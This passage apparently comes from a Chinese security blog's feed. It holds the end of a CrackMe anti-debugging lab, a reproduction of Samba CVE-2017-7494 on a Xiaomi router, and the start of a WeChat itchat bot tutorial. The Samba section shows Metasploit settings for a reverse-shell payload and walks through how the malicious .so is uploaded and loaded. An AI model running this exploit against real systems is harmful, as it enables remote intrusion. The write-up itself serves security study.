查找进程</span><br><span class="line">  &#123;</span><br><span class="line">      CloseHandle (hProcessSnap);</span><br><span class="line">      return FALSE;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  do // 遍历所有进程</span><br><span class="line">  &#123;</span><br><span class="line">      if(pe32.th32ProcessID==GetCurrentProcessId() )//判断是否是自己的进程？</span><br><span class="line">        &#123;</span><br><span class="line">          HANDLE hProcess = OpenProcess (PROCESS_ALL_ACCESS, FALSE, pe32.th32ParentProcessID); //打开父进程</span><br><span class="line">          if (hProcess)</span><br><span class="line">            &#123;</span><br><span class="line">              if (GetModuleFileNameEx(hProcess, NULL, FileName,  MAX_PATH) ) // 得到父进程名</span><br><span class="line">                  &#123;</span><br><span class="line">                    GetWindowsDirectory(szBuffer,MAX_PATH); //得到系统所在目录</span><br><span class="line">                    strcat(szBuffer,Expchar);            //组合成类似的字串D:\Winnt\Explorer.EXE</span><br><span class="line">                    if(strcmpi (FileName,szBuffer))  // 比较当前是否为Explorer.EXE进程</span><br><span class="line">                      &#123;</span><br><span class="line">                        return TRUE;   // 父进程若不是Explorer.EXE，则是调试器</span><br><span class="line">                      &#125;</span><br><span class="line">                    else</span><br><span class="line">                      &#123;</span><br><span class="line">                        return FALSE; // 无法获得进程名</span><br><span class="line">                      &#125;</span><br><span class="line">                    CloseHandle (hProcess);</span><br><span class="line">                  &#125;</span><br><span class="line">              else</span><br><span class="line">                &#123;</span><br><span class="line">                  return FALSE;//无权访问该进程</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        while (Process32Next(hProcessSnap, &amp;pe32));</span><br><span class="line">          CloseHandle (hProcessSnap);</span><br><span class="line">          return FALSE;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>由上述示例代码，我们可以看到父进程检测中调用了GetCurrentProcessId函数来判断。<br>因此在Ollydbg中首先找到GetCurrentProcessId模块（Ctrl+N），然后设置断点<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557128745/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/1.png" alt><br>查看断点是否设置成功<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557128848/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/2.png" alt><br>运行该程序,在断点00401932停下，打开任务管理器，CrackMe1的pid为4020=0xFB4<br>程序在调用完GetCurrentProcessId后，pid被放入EAX寄存器中，值为0xFB4<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557129711/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/3.png" alt><br>然后调用Openprocess函数，其参数processId为0xFB4，返回进程（CrackMe1）的句柄<br>通过ntdll.dll中的LoadLibraryA和GetProcAddress函数找到NtQueryInformationProcess:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PNTQUERYINFORMATIONPROCESS  NtQueryInformationProcess = (PNTQUERYINFORMATIONPROCESS)GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;),&quot;NtQueryInformationProcess&quot;);</span><br></pre></td></tr></table></figure></p><p><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557131510/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/4.png" alt><br>用OpenProcess获得的句柄设置NtQueryInformationProcess的对应参数，然后调用NtQueryInformationProcess，从其返回值中可以获取到CrackMe1.exe的父进程PID=0xDB4=3508,在任务管理器中查看进程名确实是ollydbg<br>然后再次调用openprocess获得父进程的句柄<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557132091/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/5.png" alt><br>最后，调用GetModuleFileNameExA通过OpenProcess返回的句柄获取父进程的文件名：<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557133154/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/6.png" alt><br>至此，成功获取到父进程的文件名，接下来将进行父进程文件名与“c:\windows\explore.exe”的字符串比较。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557133828/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/7.png" alt><br>EDX中保存explorer字符串，ESI中保存ollydbg字符串<br>然后进入循环逐位比较，比较流程是，首先取esi中第一个字符到eax，将EAX的值减去41然后存入exc中，并与19比较大小，判断是否大写，若是则eax加上20转化为小写；转化为小写之后，对edx中的字符做同样操作，然后test eax eax判断是否比较完毕，若没有则逐个比较，直到遇到不相等的字符。</p><h2 id="其他检测"><a href="#其他检测" class="headerlink" title="其他检测"></a>其他检测</h2><p><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557227067/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/8.png" alt><br>用EnumWindows枚举所有屏幕上的顶层窗口，并将窗口句柄传送给应用程序定义的回调函数，此处的回调函数调用了GetWindowTextA将指定窗口的标题栏（如果有的话）的文字拷贝到缓冲区内<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1557227506/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/9.png" alt><br>将得到的窗口标题与”ollydbg”等进行比较，看是否为调试器。</p><hr><h1 id="实验三：加花加密反调试技术分析"><a href="#实验三：加花加密反调试技术分析" class="headerlink" title="实验三：加花加密反调试技术分析"></a>实验三：加花加密反调试技术分析</h1><h2 id="对象-2"><a href="#对象-2" class="headerlink" title="对象"></a>对象</h2><p><a href="https://res.cloudinary.com/dozyfkbg3/raw/upload/v1553779413/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/CrackMe2.exe1" target="_blank" rel="noopener">CrackMe2.exe</a> 9.00 KB<br>保护措施：部分加花、部分加密、简单反调试<br>根据<a href="https://res.cloudinary.com/dozyfkbg3/raw/upload/v1553779403/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/Crackme2%E6%8F%90%E7%A4%BA.docx" target="_blank" rel="noopener">提示</a></p><h2 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h2><ol><li>加壳脱壳深入理解</li><li>尝试手动脱壳</li><li>分析CrackMe2.exe中花指令</li><li>分析CrackMe2.exe中的被加密的函数的功能</li><li>分析CrackMe2.exe中的反调试手段</li><li>分析CrackMe2.exe中混合的64位代码的功能</li></ol>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> 破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小米路由器与Samba漏洞CVE-2017-7494</title>
      <link href="/2019/03/25/Samba-CVE/"/>
      <url>/2019/03/25/Samba-CVE/</url>
      
        <content type="html"><![CDATA[<h1 id="小米路由器与Samba漏洞CVE-2017-7494"><a href="#小米路由器与Samba漏洞CVE-2017-7494" class="headerlink" title="小米路由器与Samba漏洞CVE-2017-7494"></a>小米路由器与Samba漏洞CVE-2017-7494</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Samba服务器软件存在远程执行代码漏洞。攻击者可以利用客户端将指定库文件上传到具有可写权限的共享目录，会导致服务器加载并执行指定的库文件。<br>具体执行条件如下：</p><ol><li><p>服务器打开了文件/打印机共享端口445，让其能够在公网上访问</p></li><li><p>共享文件拥有写入权限</p></li><li><p>恶意攻击者需猜解Samba服务端共享目录的物理路径</p></li></ol><h2 id="Samba介绍"><a href="#Samba介绍" class="headerlink" title="Samba介绍"></a>Samba介绍</h2><p>Samba是在Linux和Unix系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成。SMB（Server Messages Block，信息服务块）是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。</p><p>SMB协议是客户机/服务器型协议，客户机通过该协议可以访问服务器上的共享文件系统、打印机及其他资源。通过设置“NetBIOS over TCP/IP”使得Samba不但能与局域网络主机分享资源，还能与全世界的电脑分享资源。</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>处于\source3\rpc_server\src_pipe.c的is_known_pipename()函数未对传进来的管道名pipename的路径分隔符/进行识别过滤，导致可以用绝对路径调用恶意的so文件，从而远程任意代码执行。<br>首先看到is_known_pipename()函数<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/02-00-46.png" alt></p><p>跟进到smb_probe_module()<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-59-58.jpg" alt></p><p>再跟进到do_smb_load_module()，发现调用的过程就在其中,调用了传进来的moudule_name对应的init_samba_module函数<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/02-01-19.jpg" alt></p><p>我们可以通过smb服务上传一个恶意的so文件，该文件包含一个输出函数init_samba_module，随后通过上述过程进行调用，执行任意代码。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="小米路由器"><a href="#小米路由器" class="headerlink" title="小米路由器"></a>小米路由器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netstat -apnt</span><br><span class="line">tcp    0   0 192.168.31.1:445   0.0.0.0:*     LISTEN   0 572 1917/smbd</span><br><span class="line"></span><br><span class="line">nmap 192.168.31.1</span><br><span class="line">139/tcp  open     netbios-ssn</span><br><span class="line">445/tcp  open     microsoft-ds</span><br></pre></td></tr></table></figure><p><strong><em>端口已开启</em></strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/samba/smb.conf</span><br><span class="line">        deadtime = 30</span><br><span class="line">        domain master = yes</span><br><span class="line">        encrypt passwords = true</span><br><span class="line">        enable core files = no</span><br><span class="line">        guest account = nobody</span><br><span class="line">        guest ok = yes</span><br><span class="line">        invalid users =</span><br><span class="line">        local master = yes</span><br><span class="line">        load printers = no</span><br><span class="line">        map to guest = Bad User</span><br><span class="line">        min receivefile size = 16384</span><br><span class="line">        null passwords = yes</span><br><span class="line">        obey pam restrictions = yes</span><br><span class="line">        passdb backend = smbpasswd</span><br><span class="line">        preferred master = yes</span><br><span class="line">        printable = no</span><br><span class="line">        smb encrypt = disabled</span><br><span class="line">        smb passwd file = /etc/samba/smbpasswd</span><br><span class="line">        socket options =  SO_SNDBUFFORCE=1048576 SO_RCVBUFFORCE=1048576</span><br><span class="line">        smb2 max trans = 1048576</span><br><span class="line">        smb2 max write = 1048576</span><br><span class="line">        smb2 max read = 1048576</span><br><span class="line">        write cache size = 262144</span><br><span class="line">        syslog = 2</span><br><span class="line">        syslog only = yes</span><br><span class="line">        use sendfile = yes</span><br><span class="line">        writeable = yes</span><br><span class="line">        log level = 1</span><br><span class="line">        unicode = True</span><br><span class="line">        max log size = 500</span><br><span class="line">        log file = /tmp/log/samba.log</span><br><span class="line">        server role = STANDALONE</span><br><span class="line"></span><br><span class="line">[homes]</span><br><span class="line">        comment     = Home Directories</span><br><span class="line">        browsable   = no</span><br><span class="line">        read only   = no</span><br><span class="line">        create mode = 0750</span><br><span class="line"></span><br><span class="line">[data]                    ***SMB_SHARE_NAME***</span><br><span class="line">        path = /tmp       ***SMB_FOLDER***</span><br><span class="line">        read only = no    ***具备可写权限***</span><br><span class="line">        guest ok = yes    ***允许匿名***</span><br><span class="line">        create mask = 0777</span><br><span class="line">        directory mask = 0777</span><br></pre></td></tr></table></figure></p><p><strong><em>具有可写权限、目录为/tmp</em></strong></p><h2 id="攻击：使用metasploit"><a href="#攻击：使用metasploit" class="headerlink" title="攻击：使用metasploit"></a>攻击：使用metasploit</h2><h3 id="设置攻击参数"><a href="#设置攻击参数" class="headerlink" title="设置攻击参数"></a>设置攻击参数</h3><p>靶机是小米路由器R3，它的系统为mips架构，但是这个库好像对它的支持不是很好<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/is_known_pipename):</span><br><span class="line"></span><br><span class="line">   Name            Current Setting  Required  Description</span><br><span class="line">   ----            ---------------  --------  -----------</span><br><span class="line">   RHOSTS          192.168.31.1     yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT           445              yes       The SMB service port (TCP)</span><br><span class="line">   SMB_FOLDER                       no        The directory to use within the writeable SMB share</span><br><span class="line">   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (generic/shell_reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.216.129  yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   7   Linux MIPSLE</span><br></pre></td></tr></table></figure></p><h3 id="执行攻击"><a href="#执行攻击" class="headerlink" title="执行攻击"></a>执行攻击</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.216.129:4444</span><br><span class="line">[*] 192.168.31.1:445 - Using location \\192.168.31.1\data\ for the path</span><br><span class="line">[*] 192.168.31.1:445 - Retrieving the remote path of the share &apos;data&apos;</span><br><span class="line">[*] 192.168.31.1:445 - Share &apos;data&apos; has server-side path &apos;/tmp</span><br><span class="line">[*] 192.168.31.1:445 - Uploaded payload to \\192.168.31.1\data\KcQiOcbk.so</span><br><span class="line">[*] 192.168.31.1:445 - Loading the payload from server-side path /tmp/KcQiOcbk.so using \\PIPE\/tmp/KcQiOcbk.so...</span><br><span class="line">[-] 192.168.31.1:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 192.168.31.1:445 - Loading the payload from server-side path /tmp/KcQiOcbk.so using /tmp/KcQiOcbk.so...</span><br><span class="line">[-] 192.168.31.1:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure><p>虽然报错，但是查看共享文件夹/tmp却发现了生成了.so文件<br>知乎这篇<a href="https://zhuanlan.zhihu.com/p/27129229" target="_blank" rel="noopener">专栏</a>也有相同问题</p><h2 id="分析POC，查找原因"><a href="#分析POC，查找原因" class="headerlink" title="分析POC，查找原因"></a>分析POC，查找原因</h2><p>(来自<a href="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/" target="_blank" rel="noopener">Wz’blog</a>)</p><h3 id="建立SMB连接。若需要账号密码登录，则必须登录后才能继续"><a href="#建立SMB连接。若需要账号密码登录，则必须登录后才能继续" class="headerlink" title="建立SMB连接。若需要账号密码登录，则必须登录后才能继续"></a>建立SMB连接。若需要账号密码登录，则必须登录后才能继续</h3><p>从微软上扒的SMB协议建立时序图：<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-09-40.png" alt></p><p>对应POC:</p><p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/23-15-57.png" alt></p><h3 id="利用NetShareEnumAll遍历目标服务器的共享名-ShareName-以及获取对应的共享文件夹下的可写路径-Path"><a href="#利用NetShareEnumAll遍历目标服务器的共享名-ShareName-以及获取对应的共享文件夹下的可写路径-Path" class="headerlink" title="利用NetShareEnumAll遍历目标服务器的共享名(ShareName)以及获取对应的共享文件夹下的可写路径(Path)"></a>利用NetShareEnumAll遍历目标服务器的共享名(ShareName)以及获取对应的共享文件夹下的可写路径(Path)</h3><p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/00-38-48.jpg" alt></p><p>其中find_writeable_path()函数需要跟进看一下：<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-14-43.jpg" alt></p><p>再跟进看enumerate_directories()以及verify_writeable_directory函数<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/00-48-27.jpg" alt><br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-18-44.jpg" alt></p><p>可以看到代码逻辑很清楚，首先遍历出当前路径所有的文件夹，然后尝试往里面写一个随机的txt文件用作可写测试，随后删除掉txt文件，记录下可写的文件路径。<br>至此，我们得到了一个共享名(即本例中的data)以及其当前路径下的可写目录(/tmp)</p><h3 id="利用NetShareGetInfo获取共享文件夹的绝对路径-SharePath"><a href="#利用NetShareGetInfo获取共享文件夹的绝对路径-SharePath" class="headerlink" title="利用NetShareGetInfo获取共享文件夹的绝对路径(SharePath)"></a>利用NetShareGetInfo获取共享文件夹的绝对路径(SharePath)</h3><p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-26-47.jpg" alt><br>至此获取到了共享名data的绝对路径。<br>值得注意的是，这里跟早期的Payload不一样，早期的payload是靠暴力猜解目录，所以跟一些分析文章有些出入。现在的Payload是根据NetShareGetInfo直接获取到准确的路径，极大地提高了攻击的成功率。</p><h3 id="上传恶意so文件"><a href="#上传恶意so文件" class="headerlink" title="上传恶意so文件"></a>上传恶意so文件</h3><p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-38-28.jpg" alt><br>其中写入的so文件是Metasploit生成的反弹shell，很简单的执行一句命令。有一点需要注意的是里面的函数名必须是samba_init_module并且是一个导出函数，这个原因上述的漏洞分析也有提及。</p><h3 id="调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功"><a href="#调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功" class="headerlink" title="调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功"></a>调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功</h3><p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-43-02.jpg" alt><br>利用从第2步获取到的可写文件目录(Path)以及从第3步得到的共享文件绝对路径(SharePath)构造恶意管道名\PIPE\/SharePath/Path/Evil.so，然后通过SMB_COM_NT_CREATE_ANDX进行调用。<br>在复现时，调用恶意so文件总会失败，产生Error Code为：STATUS_OBJECT_NAME_NOT_FOUND的错误。尚未能明白为什么会出现这种首次失败的情况，也许要详细看看smb协议才能知道了。<br>POC代码将STATUS_OBJECT_PATH_INVALID作为我们payload被加载的标志，随后就是用NBSS协议进行了一次远程代码执行的测试，执行代码为echo随机字符串。</p><h3 id="删除恶意so文件，断开smb连接"><a href="#删除恶意so文件，断开smb连接" class="headerlink" title="删除恶意so文件，断开smb连接"></a>删除恶意so文件，断开smb连接</h3><p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-45-01.png" alt></p><p>由msf给出的poc过程可见，对小米路由器的攻击在第五步出现问题，因此出现Failed to load STATUS_OBJECT_NAME_NOT_FOUND</p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Samba </tag>
            
            <tag> 远程执行 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用itchat定时转发微信消息</title>
      <link href="/2019/03/23/auto-send-WX/"/>
      <url>/2019/03/23/auto-send-WX/</url>
      
        <content type="html"><![CDATA[<p>我们实验室有个光荣传统，每天早上起床叫醒我的不是闹钟，而是群里雷打不动的安全新闻（其实我免提醒了2333）<br>而这个发送新闻的人，一代一代的传承，我没想到竟然有一天会落在我头上，哭了o(╥﹏╥)o<br>为了不暴露我的起床时间，同时能保质保量的完成任务，我决定做个机器人帮我完成。<br>这就是这片po文的由来啦！</p><h1 id="大杀器itchat"><a href="#大杀器itchat" class="headerlink" title="大杀器itchat"></a>大杀器itchat</h1><h2 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h2><p>先来一段<a href="https://itchat.readthedocs.io/zh/latest/" target="_blank" rel="noopener">itchat</a>的官方介绍吧</p><blockquote><p>itchat是一个开源的微信个人号接口，使用python调用微信从未如此简单。<br>使用不到三十行的代码，你就可以完成一个能够处理所有信息的微信机器人。<br>当然，该api的使用远不止一个机器人，更多的功能等着你来发现，比如这些。<br>该接口与公众号接口itchatmp共享类似的操作方式，学习一次掌握两个工具。<br>如今微信已经成为了个人社交的很大一部分，希望这个项目能够帮助你扩展你的个人的微信号、方便自己的生活。</p></blockquote><p>实际上，itchat是对微信网页端的爬虫，所以，网页端可以实现的功能都有，那么，我想要的定时群发微信消息，自然不在话下！</p><h2 id="初步尝试"><a href="#初步尝试" class="headerlink" title="初步尝试"></a>初步尝试</h2><ul><li><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install itchat</span><br></pre></td></tr></table></figure></li><li><p>一个简单实例：实现给文件传输助手发送消息</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import itchat</span><br><span class="line">itchat.auto_login()</span><br><span class="line">itchat.send(&apos;Hello, filehelper&apos;, toUserName=&apos;filehelper&apos;)</span><br></pre></td></tr></table></figure><h1 id="实现定时转发"><a href="#实现定时转发" class="headerlink" title="实现定时转发"></a>实现定时转发</h1><p>这个的实现需要注册msg_register,逻辑很简单，当收到指定群里的指定消息时，将消息转发到另一个群。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import itchat</span><br><span class="line">from datetime import datetime</span><br><span class="line">import time</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">from itchat.content import TEXT</span><br><span class="line">from itchat.content import *</span><br><span class="line">from apscheduler.schedulers.blocking import BlockingScheduler</span><br><span class="line"></span><br><span class="line">@itchat.msg_register([TEXT], isFriendChat=True, isGroupChat=True, isMpChat=True)</span><br><span class="line">def getContent(msg):</span><br><span class="line">    global g_msg</span><br><span class="line">    groups = itchat.get_chatrooms(update = True)</span><br><span class="line">    for g in groups:</span><br><span class="line">        #print(g[&apos;NickName&apos;])</span><br><span class="line">        if g[&apos;NickName&apos;] == &apos;被转发的群名&apos;:</span><br><span class="line">            from_group = g[&apos;UserName&apos;]</span><br><span class="line">    if &apos;每日安全简讯&apos; in msg[&apos;Content&apos;]:</span><br><span class="line">        print(&quot;get message from &quot; + msg[&apos;FromUserName&apos;])</span><br><span class="line">        if msg[&apos;FromUserName&apos;] == from_group:</span><br><span class="line">            g_msg = msg[&apos;Content&apos;]</span><br><span class="line">            print(&apos;成功获得群消息，等待转发&apos;)</span><br><span class="line">            print(int(time.strftime(&quot;%H%M%S&quot;)))</span><br><span class="line">            while(1):</span><br><span class="line">                if int(time.strftime(&quot;%H%M%S&quot;)) &gt; 80000:</span><br><span class="line">                    SendMessage(g_msg,&apos;发送的对象群名&apos;)</span><br><span class="line">                    g_msg = &apos;&apos;</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">def SendMessage(context,gname):</span><br><span class="line">    itchat.get_chatrooms(update = True)</span><br><span class="line">    users = itchat.search_chatrooms(name=gname)</span><br><span class="line">    userName = users[0][&apos;UserName&apos;]</span><br><span class="line">    itchat.send_msg(context,toUserName=userName)</span><br><span class="line">    print(&quot;\n发送时间: &quot; + datetime.now().strftime(&quot;%Y-%m-%d %H:%M:%S&quot;) + &quot;\n&quot; &quot;发送到：&quot; + gname + &quot;\n&quot; + &quot;发送内容：&quot; + context + &quot;\n&quot;)</span><br><span class="line">    print(&quot;*********************************************************************************&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    itchat.auto_login(hotReload=True,enableCmdQR=2)</span><br><span class="line">    itchat.run(blockThread=False)</span><br></pre></td></tr></table></figure></p><h1 id="添加周期防掉线"><a href="#添加周期防掉线" class="headerlink" title="添加周期防掉线"></a>添加周期防掉线</h1><p>据说每三十分钟发送一次消息可防止网页端微信掉线~~<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def loop_send():</span><br><span class="line">    nowTime = datetime.now().strftime(&quot;%Y-%m-%d %H:%M:%S&quot;)</span><br><span class="line">    context = &apos;现在是北京时间 :\n&apos;+ nowTime +&apos;\n\n我们还活着&apos;</span><br><span class="line">    itchat.get_chatrooms(update = True)</span><br><span class="line">    users = itchat.search_friends(name=u&apos;chengkun&apos;)</span><br><span class="line">    userName = users[0][&apos;UserName&apos;]</span><br><span class="line">    